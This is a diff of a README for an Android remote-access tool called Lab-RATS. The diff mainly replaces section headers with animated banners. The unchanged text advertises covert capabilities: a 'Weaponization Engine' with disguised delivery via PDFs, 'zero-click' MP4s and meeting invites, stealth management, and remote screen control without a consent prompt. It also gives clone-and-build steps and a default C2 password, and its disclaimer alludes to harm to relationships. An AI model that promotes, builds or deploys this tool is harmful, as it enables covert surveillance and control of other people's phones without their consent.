@@ -13,14 +13,17 @@
   <img src="https://img.shields.io/badge/License-MIT-orange?style=for-the-badge&logo=opensourceinitiative&logoColor=white">
 </p>
 
-# Lab-RATS - v1.6
+<img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=36&pause=11800&color=00F2FF&center=false&vStart=true&width=800&height=70&lines=Lab-RATS" alt="Typing Banner" />
+</p>
+
 > Lightweight Android-Based Remote Administration Tool for Security: *(L.A.B. - R.A.T.S)*
 
 **Developed from the ground up by K4N3CO, Lab-RATS is an open-source, lightweight Android Remote Administration framework** packed with powerful **monitoring** and **interaction capabilities**. The system automates the generation of custom, signed `.apk` files for **deployment onto any Android device**, providing full device telemetry via a **sleek, web-based C2 dashboard**. Built to adapt to **strict modern mobile environments**, it delivers a **robust feature suite** that **operates reliably** across both **legacy** and the **newest Android releases**.
 
 ---
 
-## 🌎 Direct IPv6 Access: *(P2P connection)*
+<img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=26&pause=11800&color=00F2FF&center=false&vStart=true&width=800&height=70&lines=Direct+IPv6+Access" alt="Typing Banner" />
+</p>
 
 **Lab-RATS leverages the unique characteristics of publicly routable IPv6 addresses assigned by modern Wi-Fi and cellular *(5G/LTE)* carriers**. By **binding the control server directly to a device's Global Unicast Address** *(GUA)*, the tool **completely bypasses Carrier-Grade NAT** *(CGNAT)* and **inbound firewall restrictions**. This architecture **enables seamless, Zero-Configuration peer-to-peer** *(P2P)* **remote access from any modern web browser worldwide**—completely eliminating the need for **router manipulation, port forwarding**, or **third-party tunneling services** like **Ngrok** or **Pinggy**.
 <details>
@@ -34,7 +37,8 @@
 
 ---
 
-## 🛡️ Core Features & Security
+<img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=26&pause=11800&color=00F2FF&center=false&vStart=true&width=800&height=70&lines=Core+Features+and+Security" alt="Typing Banner" />
+</p>
 
 ### 🔐 Remote C2 Security & Secure Handshake:
 - The **web dashboard** is **protected by a secure login wall** (**Default Password: admin1337**). The password can be **changed directly from the Terminal home page** for **enhanced security**.
@@ -50,7 +54,8 @@
 
 ---
 
-## 🕵️ Covert Operations & Stealth Management
+<img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=26&pause=11800&color=00F2FF&center=false&vStart=true&width=800&height=70&lines=Covert+Operations+and+Stealth+Management" alt="Typing Banner" />
+</p>
 
 ### 💉 Payload Delivery Vectors: *(Installing APK onto Target Device)*
 - The **Weaponization Engine** has been **overhauled to support multiple high-success delivery methods** *(Stealth PDF, Zero-Click MP4, Meeting Invite and Many More)*, **ensuring reliable access** across **all modern mobile environments**.
@@ -86,7 +91,8 @@
 
 ---
 
-## 🚀 Remote Capabilities
+<img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=26&pause=11800&color=00F2FF&center=false&vStart=true&width=800&height=70&lines=Remote+Capabilities" alt="Typing Banner" />
+</p>
 
 ### 👻 Ghost_Operations:
 - **Ghost Control/Live Feed**: **Cast & Control the live screen remotely** with **NO "Consent Prompt" required**.
@@ -133,7 +139,8 @@ The **Terminal Tabs Built-in Shell has been overhauled** for **professional work
 
 ---
 
-## 🧠 Native Integration
+<img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=26&pause=11800&color=00F2FF&center=false&vStart=true&width=800&height=70&lines=Native+Integration" alt="Typing Banner" />
+</p>
 
 ### 🛠️ Termux Bridge Integration:
 **Lab-RATS** now features a **high-performance bridge to the Termux environment**. If **Termux is installed on the target device**, the remote terminal can **instantly elevate its capabilities**:
@@ -150,7 +157,8 @@ termux-reload-settings
 
 ---
 
-## 📡 Command & Control (C2) Options
+<img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=26&pause=11800&color=00F2FF&center=false&vStart=true&width=800&height=70&lines=Command+and+Control+(C2)+Options" alt="Typing Banner" />
+</p>
 
 **Lab-RATS** supports **two primary methods** for **tracking your device fleet** and **receiving remote data**.
 
@@ -238,7 +246,8 @@ function handleRequest(e) {
 
 ---
 
-## 📋 System Requirements & Prerequisites
+<img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=26&pause=11800&color=00F2FF&center=false&vStart=true&width=800&height=70&lines=System+Requirements+and+Prerequisites" alt="Typing Banner" />
+</p>
 
 To **build, compile**, and **deploy Lab-RATS** or **host the C2 server**, ensure **your environment meets the following requirements**:
 
@@ -267,10 +276,11 @@ To **build, compile**, and **deploy Lab-RATS** or **host the C2 server**, ensure
 
 ---
 
-## 🛠️ Get Started
+<img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=26&pause=11800&color=00F2FF&center=false&vStart=true&width=800&height=70&lines=Get+Started" alt="Typing Banner" />
+</p>
 
 ### 1. Building the APK (on PC)
-1.  **Download the Repository**: `git clone https://github.com/KAN3C0/Lab-RATS-v1.6.git`
+1.  **Download the Repository**: `git clone https://github.com/K4N3CO/Lab-RATS-v1.6.git`
 2.  **Navigate** to: `cd /Lab-RATS-v1.6/apk-builder/`
 3.  **Execute** the **Builder**:
     *   **Mac/Linux**: `chmod +x build.sh && ./build.sh`
@@ -312,7 +322,8 @@ Once the **Target device** downloads the **APK**:
 
 ---
 
-## ⭐ Support the Development
+<img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=26&pause=11800&color=00F2FF&center=false&vStart=true&width=800&height=70&lines=Support+the+Development" alt="Typing Banner" />
+</p>
 
 **If** you find **Lab-RATS awesome** and **useful for your security research**, **please Star ⭐ the project**—it **drives further development!!**
 
@@ -334,7 +345,8 @@ bc1q8d66m0qthnh6nw9hc5wl09m7pfydk46q5w8rxx
 
 ---
 
-## 📸 Video Clips
+<img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=26&pause=11800&color=00F2FF&center=false&vStart=true&width=800&height=70&lines=Video+Clips" alt="Typing Banner" />
+</p>
 
 ### APK-Builder Example *(Mac OS)*:
 
@@ -360,7 +372,8 @@ https://github.com/user-attachments/assets/2ac424d5-9df6-4732-aa4e-6b486a9809a4
 
 ---
 
-## 📸 Screenshots
+<img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=26&pause=11800&color=00F2FF&center=false&vStart=true&width=800&height=70&lines=Screenshots" alt="Typing Banner" />
+</p>
 
 ### 00. Lab-RATS.apk Installed on Android Device:
 <details>
@@ -501,15 +514,17 @@ https://github.com/user-attachments/assets/2ac424d5-9df6-4732-aa4e-6b486a9809a4
 
 ---
 
-## ⚠️ Disclaimer
+<img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=26&pause=11800&color=00F2FF&center=false&vStart=true&width=800&height=70&lines=Disclaimer" alt="Typing Banner" />
+</p>
 
 This tool is for **educational and authorized security testing purposes ONLY!**. The **developers & contributors** assume **NO responsibility** for **ANY** **misuse, damage to devices or relationships** caused by this software. **Please use it responsibly**. **Thank you!**
 
 ---
 
-## 📄 License
+<img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=26&pause=11800&color=00F2FF&center=false&vStart=true&width=800&height=70&lines=License" alt="Typing Banner" />
+</p>
 
-**Lab-RATS-v1.6** is **Licensed** to **KAN3C0** under the [MIT License](LICENSE).
+**Lab-RATS-v1.6** is **Licensed** to **K4N3CO** under the [MIT License](LICENSE).
 
 ---
 
